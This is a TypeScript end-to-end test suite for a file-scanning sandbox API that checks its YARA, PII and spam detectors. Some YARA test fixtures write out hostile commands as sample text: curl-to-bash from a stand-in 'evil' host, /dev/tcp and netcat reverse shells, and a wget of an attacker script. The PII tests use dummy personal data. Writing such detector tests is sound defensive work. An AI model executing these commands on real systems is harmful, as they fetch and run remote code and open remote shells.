import { Test, TestingModule } from '@nestjs/testing';
import {
  FastifyAdapter,
  NestFastifyApplication,
} from '@nestjs/platform-fastify';
import multipart from '@fastify/multipart';
import { AppModule } from '../src/app.module';
import { PrismaService } from '../src/prisma.service';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import FormData from 'form-data';
import fetch from 'node-fetch';

/**
 * Sandbox E2E tests.
 *
 * These tests spin up the full NestJS + Fastify app on an ephemeral port,
 * upload real files via multipart/form-data, and assert that the YARA
 * detector returns expected findings.
 *
 * Requirements: CLI venv with `--group detectors` installed (YARA included).
 */
describe('Sandbox (e2e)', () => {
  let app: NestFastifyApplication;
  let prisma: PrismaService;
  let baseUrl: string;
  const createdRunIds: string[] = [];

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication<NestFastifyApplication>(
      new FastifyAdapter(),
    );

    await app.register(multipart as any, {
      limits: { fileSize: 50 * 1024 * 1024, files: 1 },
    });

    prisma = app.get(PrismaService);

    await app.init();
    await app.listen(0, '127.0.0.1'); // random free port
    baseUrl = await app.getUrl();
  });

  afterAll(async () => {
    // Clean up sandbox runs created during tests
    if (createdRunIds.length > 0) {
      await prisma.sandboxRun.deleteMany({
        where: { id: { in: createdRunIds } },
      });
    }
    await prisma.$disconnect();
    await app.close();
  });

  // ---------------------------------------------------------------------------
  // Helper
  // ---------------------------------------------------------------------------

  async function submitSandboxRun(
    fileContent: string,
    fileName: string,
    detectors: object[],
  ) {
    const tmpPath = path.join(
      os.tmpdir(),
      `sandbox-e2e-${Date.now()}-${fileName}`,
    );
    fs.writeFileSync(tmpPath, fileContent, 'utf8');

    try {
      const form = new FormData();
      form.append('file', fs.createReadStream(tmpPath), fileName);
      form.append('detectors', JSON.stringify(detectors));

      const res = await fetch(`${baseUrl}/sandbox/runs`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });

      return {
        status: res.status,
        body: (await res.json()) as Record<string, unknown>,
      };
    } finally {
      fs.unlinkSync(tmpPath);
    }
  }

  async function submitSandboxRunBuffer(
    fileContent: Buffer,
    fileName: string,
    detectors: object[],
  ) {
    const tmpPath = path.join(
      os.tmpdir(),
      `sandbox-e2e-${Date.now()}-${fileName}`,
    );
    fs.writeFileSync(tmpPath, fileContent);

    try {
      const form = new FormData();
      form.append('file', fs.createReadStream(tmpPath), fileName);
      form.append('detectors', JSON.stringify(detectors));

      const res = await fetch(`${baseUrl}/sandbox/runs`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });

      return {
        status: res.status,
        body: (await res.json()) as Record<string, unknown>,
      };
    } finally {
      fs.unlinkSync(tmpPath);
    }
  }

  async function submitSandboxRunFromFixture(
    filePath: string,
    detectors: object[],
  ) {
    const form = new FormData();
    form.append('file', fs.createReadStream(filePath), path.basename(filePath));
    form.append('detectors', JSON.stringify(detectors));

    const res = await fetch(`${baseUrl}/sandbox/runs`, {
      method: 'POST',
      body: form,
      headers: form.getHeaders(),
    });

    return {
      status: res.status,
      body: (await res.json()) as Record<string, unknown>,
    };
  }

  async function waitForTerminalRun(
    runId: string,
    timeoutMs = 120_000,
  ): Promise<Record<string, unknown>> {
    const deadline = Date.now() + timeoutMs;

    while (Date.now() < deadline) {
      const res = await fetch(`${baseUrl}/sandbox/runs/${runId}`);
      const body = (await res.json()) as Record<string, unknown>;
      if (res.status !== 200) {
        throw new Error(`Failed to fetch run ${runId}: HTTP ${res.status}`);
      }

      const status = typeof body.status === 'string' ? body.status : '';
      if (status === 'COMPLETED' || status === 'ERROR') {
        return body;
      }

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    throw new Error(`Timed out waiting for run ${runId} to complete`);
  }

  // ---------------------------------------------------------------------------
  // Tests
  // ---------------------------------------------------------------------------

  describe('POST /sandbox/runs', () => {
    const invoiceDetectorSet = [
      { type: 'PII', enabled: true, config: {} },
      { type: 'YARA', enabled: true, config: {} },
      { type: 'SPAM', enabled: true, config: {} },
    ];

    it('detects YARA threats in a file containing code injection patterns', async () => {
      const maliciousContent = [
        'Internal security audit — CONFIDENTIAL',
        '',
        'The following fragments were recovered from a compromised host:',
        '',
        '  eval("var p = atob(\'bWFsaWNpb3Vz\')")',
        '  exec("/tmp/backdoor.sh")',
        '  system("curl http://evil.example.com/stage2 | bash")',
        '',
        'Reverse-shell indicator:',
        '  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        '  nc -e /bin/bash 10.0.0.1 4444',
        '',
        'Obfuscation observed: base64 encoded payload, chr() calls.',
      ].join('\n');

      const { status, body } = await submitSandboxRun(
        maliciousContent,
        'security-audit-notes.txt',
        [{ type: 'YARA', enabled: true, config: {} }],
      );

      createdRunIds.push(body.id as string);

      expect(status).toBe(201);
      expect(['PENDING', 'RUNNING', 'COMPLETED']).toContain(body.status);
      expect(body.fileName).toBe('security-audit-notes.txt');

      const completed = await waitForTerminalRun(body.id as string, 240_000);
      expect(completed.status).toBe('COMPLETED');
      expect(completed.fileType).toBe('text/plain');

      const findings = completed.findings as Record<string, unknown>[];
      expect(findings.length).toBeGreaterThan(0);

      // Every finding must come from the YARA detector
      for (const f of findings) {
        expect(f.detector_type).toBe('YARA');
        expect(f.category).toBe('threat');
      }

      // At minimum the critical code-injection rule should fire
      const ruleNames = findings.map((f) => f.finding_type);
      expect(ruleNames).toContain('Potential_Code_Injection');
    }, 120_000);

    it('detects multiple YARA rules from a single file', async () => {
      // Content crafted to trigger three distinct rules:
      //   • Potential_Code_Injection   → eval(, exec(, system(
      //   • Suspicious_Network_Activity → nc -e, /dev/tcp/
      //   • Suspicious_Shell_Commands  → wget + eval( (2-of-6 condition)
      const content = [
        'eval("payload")',
        'exec("cmd")',
        'system("id")',
        'nc -e /bin/bash 192.168.1.1 1337',
        '/dev/tcp/192.168.1.1/1337',
        'wget http://attacker.example.com/evil.sh',
      ].join('\n');

      const { status, body } = await submitSandboxRun(
        content,
        'multi-rule-sample.txt',
        [{ type: 'YARA', enabled: true, config: {} }],
      );

      createdRunIds.push(body.id as string);

      expect(status).toBe(201);
      expect(['PENDING', 'RUNNING', 'COMPLETED']).toContain(body.status);

      const completed = await waitForTerminalRun(body.id as string, 240_000);
      expect(completed.status).toBe('COMPLETED');

      const findings = completed.findings as Record<string, unknown>[];
      const ruleNames = new Set(findings.map((f) => f.finding_type));

      expect(ruleNames).toContain('Potential_Code_Injection');
      expect(ruleNames).toContain('Suspicious_Network_Activity');
      expect(ruleNames).toContain('Suspicious_Shell_Commands');

      // Severities should be critical and high/medium
      const severities = findings.map((f) => f.severity);
      expect(severities).toContain('critical');
    }, 240_000);

    it('returns zero findings for clean content', async () => {
      const cleanContent = [
        'Q3 Marketing Report',
        '',
        'Product launch is scheduled for next quarter.',
        'Revenue targets are on track. No action required.',
      ].join('\n');

      const { status, body } = await submitSandboxRun(
        cleanContent,
        'q3-report.txt',
        [{ type: 'YARA', enabled: true, config: {} }],
      );

      createdRunIds.push(body.id as string);

      expect(status).toBe(201);
      expect(['PENDING', 'RUNNING', 'COMPLETED']).toContain(body.status);

      const completed = await waitForTerminalRun(body.id as string);
      expect(completed.status).toBe('COMPLETED');
      expect((completed.findings as unknown[]).length).toBe(0);
    }, 120_000);

    it('detects PII findings from pii-sample-2 fixture', async () => {
      const fixturePath = path.resolve(
        __dirname,
        'fixtures',
        'sandbox',
        'pii-sample-2.txt',
      );

      expect(fs.existsSync(fixturePath)).toBe(true);

      const { status, body } = await submitSandboxRunFromFixture(fixturePath, [
        {
          type: 'PII',
          enabled: true,
          config: {
            enabled_patterns: ['email', 'ssn', 'credit_card', 'phone_number'],
            confidence_threshold: 0.5,
          },
        },
      ]);

      createdRunIds.push(body.id as string);

      expect(status).toBe(201);
      expect(['PENDING', 'RUNNING', 'COMPLETED']).toContain(body.status);

      const completed = await waitForTerminalRun(body.id as string, 240_000);
      expect(completed.status).toBe('COMPLETED');
      expect(completed.fileType).toBe('text/plain');

      const findings = completed.findings as Record<string, unknown>[];
      expect(findings.length).toBeGreaterThan(0);

      for (const f of findings) {
        expect(f.detector_type).toBe('PII');
      }

      const findingTypes = findings.map((f) => String(f.finding_type));
      expect(
        findingTypes.some((type) =>
          ['EMAIL_ADDRESS', 'US_SSN', 'PHONE_NUMBER', 'CREDIT_CARD'].includes(
            type,
          ),
        ),
      ).toBe(true);

      const matchedContent = findings.map((f) => String(f.matched_content));
      expect(matchedContent).toEqual(
        expect.arrayContaining([
          expect.stringContaining('john.doe@example.com'),
          expect.stringContaining('4111 1111 1111 1111'),
        ]),
      );

      expect(
        matchedContent.some(
          (value) => value.includes('123-45-6789') || value.includes('SSN'),
        ),
      ).toBe(true);
    }, 240_000);

    it('detects PII findings from a JSON upload', async () => {
      const jsonContent = JSON.stringify(
        {
          customer: {
            name: 'Jane Doe',
            email: 'jane.doe@example.com',
            ssn: '123-45-6789',
            phone: '+1 415-555-0199',
            credit_card: '4111 1111 1111 1111',
          },
          metadata: {
            source: 'sandbox-json-e2e',
          },
        },
        null,
        2,
      );

      const { status, body } = await submitSandboxRun(
        jsonContent,
        'customer-record.json',
        [{ type: 'PII', enabled: true, config: {} }],
      );

      createdRunIds.push(body.id as string);

      expect(status).toBe(201);
      expect(['PENDING', 'RUNNING', 'COMPLETED']).toContain(body.status);

      const completed = await waitForTerminalRun(body.id as string, 240_000);
      expect(completed.status).toBe('COMPLETED');
      expect(completed.fileType).toBe('application/json');

      const findings = completed.findings as Record<string, unknown>[];
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.every((finding) => finding.detector_type === 'PII')).toBe(
        true,
      );

      const findingTypes = findings.map((finding) =>
        String(finding.finding_type),
      );
      expect(findingTypes).toEqual(
        expect.arrayContaining([
          'EMAIL_ADDRESS',
          'PHONE_NUMBER',
          'CREDIT_CARD',
        ]),
      );
      expect(
        findingTypes.some((type) => ['US_SSN', 'UK_NHS'].includes(type)),
      ).toBe(true);

      const matchedContent = findings.map((finding) =>
        String(finding.matched_content),
      );
      expect(matchedContent).toEqual(
        expect.arrayContaining([
          expect.stringContaining('jane.doe@example.com'),
          expect.stringContaining('4111 1111 1111 1111'),
          expect.stringContaining('415-555-0199'),
        ]),
      );
    }, 240_000);

    it('detects PII findings from a YAML upload', async () => {
      const yamlContent = [
        'customer:',
        '  name: Jane Doe',
        '  email: jane.doe@example.com',
        '  ssn: 123-45-6789',
        '  phone: +1 415-555-0199',
        '  credit_card: 4111 1111 1111 1111',
        'metadata:',
        '  source: sandbox-yaml-e2e',
      ].join('\n');

      const { status, body } = await submitSandboxRun(
        yamlContent,
        'customer-record.yml',
        [{ type: 'PII', enabled: true, config: {} }],
      );

      createdRunIds.push(body.id as string);

      expect(status).toBe(201);
      expect(['PENDING', 'RUNNING', 'COMPLETED']).toContain(body.status);

      const completed = await waitForTerminalRun(body.id as string, 240_000);
      expect(completed.status).toBe('COMPLETED');
      expect(completed.fileType).toBe('text/plain');

      const findings = completed.findings as Record<string, unknown>[];
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.every((finding) => finding.detector_type === 'PII')).toBe(
        true,
      );

      const findingTypes = findings.map((finding) =>
        String(finding.finding_type),
      );
      expect(findingTypes).toEqual(
        expect.arrayContaining([
          'EMAIL_ADDRESS',
          'PHONE_NUMBER',
          'CREDIT_CARD',
        ]),
      );
      expect(
        findingTypes.some((type) => ['US_SSN', 'UK_NHS'].includes(type)),
      ).toBe(true);

      const matchedContent = findings.map((finding) =>
        String(finding.matched_content),
      );
      expect(matchedContent).toEqual(
        expect.arrayContaining([
          expect.stringContaining('jane.doe@example.com'),
          expect.stringContaining('4111 1111 1111 1111'),
          expect.stringContaining('415-555-0199'),
        ]),
      );
    }, 240_000);

    it('processes sample_invoice.pdf with PII/YARA/SPAM detector set', async () => {
      const fixturePath = path.resolve(
        __dirname,
        'fixtures',
        'sandbox',
        'sample_invoice.pdf',
      );

      expect(fs.existsSync(fixturePath)).toBe(true);

      const { status, body } = await submitSandboxRunFromFixture(
        fixturePath,
        invoiceDetectorSet,
      );

      createdRunIds.push(body.id as string);
      expect(status).toBe(201);
      expect(['PENDING', 'RUNNING', 'COMPLETED']).toContain(body.status);

      const completed = await waitForTerminalRun(body.id as string);
      expect(completed.status).toBe('COMPLETED');
      expect(completed.fileType).toBe('application/pdf');
      expect(completed.contentType).toBe('BINARY');

      const configuredDetectors = (
        completed.detectors as Array<{
          type?: string;
        }>
      )?.map((detector) => detector.type);
      expect(configuredDetectors).toEqual(
        expect.arrayContaining(['PII', 'YARA', 'SPAM']),
      );

      const findings = Array.isArray(completed.findings)
        ? (completed.findings as Record<string, unknown>[])
        : [];
      expect(Array.isArray(findings)).toBe(true);
      if (findings.length > 0) {
        expect(
          findings.some((finding) =>
            ['PII', 'YARA', 'SPAM'].includes(String(finding.detector_type)),
          ),
        ).toBe(true);
      }
    }, 120_000);

    it('processes customers-100.csv with PII/YARA/SPAM detector set', async () => {
      const fixturePath = path.resolve(
        __dirname,
        'fixtures',
        'sandbox',
        'customers-100.csv',
      );

      expect(fs.existsSync(fixturePath)).toBe(true);

      const { status, body } = await submitSandboxRunFromFixture(
        fixturePath,
        invoiceDetectorSet,
      );

      createdRunIds.push(body.id as string);
      expect(status).toBe(201);
      expect(['PENDING', 'RUNNING', 'COMPLETED']).toContain(body.status);

      const completed = await waitForTerminalRun(body.id as string);
      expect(completed.status).toBe('COMPLETED');
      expect(completed.fileType).toBe('text/csv');
      expect(completed.contentType).toBe('TABLE');

      const configuredDetectors = (
        completed.detectors as Array<{
          type?: string;
        }>
      )?.map((detector) => detector.type);
      expect(configuredDetectors).toEqual(
        expect.arrayContaining(['PII', 'YARA', 'SPAM']),
      );

      const findings = completed.findings as Record<string, unknown>[];
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.some((finding) => finding.detector_type === 'PII')).toBe(
        true,
      );
    }, 120_000);

    it('classifies csv/xlsx/parquet uploads as TABLE content type', async () => {
      const cases: Array<{
        fileName: string;
        content: Buffer;
        expectedMimeType: string;
      }> = [
        {
          fileName: 'sample-data.csv',
          content: Buffer.from(
            'name,email\nJohn Doe,john.doe@example.com\n',
            'utf8',
          ),
          expectedMimeType: 'text/csv',
        },
        {
          fileName: 'sample-data.xlsx',
          content: Buffer.from([0x00, 0xff, 0x80, 0x10, 0x45, 0x00, 0xab]),
          expectedMimeType:
            'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        },
        {
          fileName: 'sample-data.parquet',
          content: Buffer.from([0x00, 0xaa, 0x10, 0x80, 0x55, 0x00, 0xcc]),
          expectedMimeType: 'application/parquet',
        },
      ];

      for (const testCase of cases) {
        const { status, body } = await submitSandboxRunBuffer(
          testCase.content,
          testCase.fileName,
          [{ type: 'PII', enabled: true, config: {} }],
        );

        createdRunIds.push(body.id as string);
        expect(status).toBe(201);

        const completed = await waitForTerminalRun(body.id as string);
        expect(completed.status).toBe('COMPLETED');
        expect(completed.contentType).toBe('TABLE');
        expect(completed.fileType).toBe(testCase.expectedMimeType);
      }
    }, 120_000);

    it('rejects an invalid detector type', async () => {
      const { status, body } = await submitSandboxRun(
        'hello world',
        'test.txt',
        [{ type: 'INVALID_DETECTOR', enabled: true, config: {} }],
      );

      expect(status).toBe(400);
      expect(body.message as string).toMatch(/Invalid detector type/);
    }, 15_000);
  });

  // ---------------------------------------------------------------------------

  describe('GET /sandbox/runs', () => {
    it('returns a paginated list of runs', async () => {
      const res = await fetch(`${baseUrl}/sandbox/runs`);
      const body = (await res.json()) as Record<string, unknown>;

      expect(res.status).toBe(200);
      expect(body).toHaveProperty('items');
      expect(body).toHaveProperty('total');
      expect(body).toHaveProperty('skip', 0);
      expect(body).toHaveProperty('limit', 50);
      expect(Array.isArray(body.items)).toBe(true);
    }, 240_000);

    it('respects skip and limit params', async () => {
      const res = await fetch(`${baseUrl}/sandbox/runs?skip=0&limit=1`);
      const body = (await res.json()) as Record<string, unknown>;

      expect(res.status).toBe(200);
      expect((body.items as unknown[]).length).toBeLessThanOrEqual(1);
      expect(body.limit).toBe(1);
    });

    it('supports search, filters and sorting', async () => {
      const marker = `sandbox-filter-${Date.now()}`;

      const cleanRun = await submitSandboxRun(
        `${marker}\nclean text content`,
        `${marker}-clean.txt`,
        [{ type: 'YARA', enabled: true, config: {} }],
      );
      createdRunIds.push(cleanRun.body.id as string);
      expect(cleanRun.status).toBe(201);

      const tableRun = await submitSandboxRunBuffer(
        Buffer.from(
          `name,email\nJane Doe,jane.${Date.now()}@example.com\n`,
          'utf8',
        ),
        `${marker}-customers.csv`,
        [
          { type: 'PII', enabled: true, config: {} },
          { type: 'SPAM', enabled: true, config: {} },
        ],
      );
      createdRunIds.push(tableRun.body.id as string);
      expect(tableRun.status).toBe(201);

      const cleanCompleted = await waitForTerminalRun(
        cleanRun.body.id as string,
      );
      const tableCompleted = await waitForTerminalRun(
        tableRun.body.id as string,
      );
      expect(cleanCompleted.status).toBe('COMPLETED');
      expect(tableCompleted.status).toBe('COMPLETED');

      const filterQuery = new URLSearchParams({
        search: marker,
        status: 'COMPLETED',
        contentType: 'TABLE',
        detectorType: 'PII',
        hasFindings: 'true',
        sortBy: 'FINDINGS_COUNT',
        sortOrder: 'DESC',
        skip: '0',
        limit: '10',
      });

      const filteredRes = await fetch(
        `${baseUrl}/sandbox/runs?${filterQuery.toString()}`,
      );
      const filteredBody = (await filteredRes.json()) as Record<
        string,
        unknown
      >;

      expect(filteredRes.status).toBe(200);
      expect(filteredBody).toHaveProperty('items');
      expect(filteredBody).toHaveProperty('skip', 0);
      expect(filteredBody).toHaveProperty('limit', 10);
      expect(Number(filteredBody.total)).toBeGreaterThan(0);

      const items = filteredBody.items as Array<Record<string, unknown>>;
      expect(items.length).toBeGreaterThan(0);
      expect(
        items.every(
          (item) =>
            String(item.fileName).includes(marker) &&
            item.status === 'COMPLETED' &&
            item.contentType === 'TABLE',
        ),
      ).toBe(true);
      expect(
        items.some((item) => item.id === (tableRun.body.id as string)),
      ).toBe(true);

      const noFindingsRes = await fetch(
        `${baseUrl}/sandbox/runs?search=${encodeURIComponent(marker)}&hasFindings=false`,
      );
      const noFindingsBody = (await noFindingsRes.json()) as Record<
        string,
        unknown
      >;
      expect(noFindingsRes.status).toBe(200);
      const noFindingsItems = noFindingsBody.items as Array<
        Record<string, unknown>
      >;
      expect(
        noFindingsItems.some(
          (item) => item.id === (cleanRun.body.id as string),
        ),
      ).toBe(true);
    }, 120_000);
  });

  describe('GET /sandbox/runs/:id', () => {
    it('returns the run by id', async () => {
      // Use one of the runs created in earlier tests
      const listRes = await fetch(`${baseUrl}/sandbox/runs?limit=1`);
      const listBody = (await listRes.json()) as {
        items: Record<string, unknown>[];
      };
      const firstId = listBody.items[0]?.id as string;

      const res = await fetch(`${baseUrl}/sandbox/runs/${firstId}`);
      const body = (await res.json()) as Record<string, unknown>;

      expect(res.status).toBe(200);
      expect(body.id).toBe(firstId);
      expect(body).toHaveProperty('status');
      expect(body).toHaveProperty('findings');
    });

    it('returns 404 for a non-existent id', async () => {
      const res = await fetch(`${baseUrl}/sandbox/runs/non-existent-id-00000`);
      expect(res.status).toBe(404);
    });
  });
});
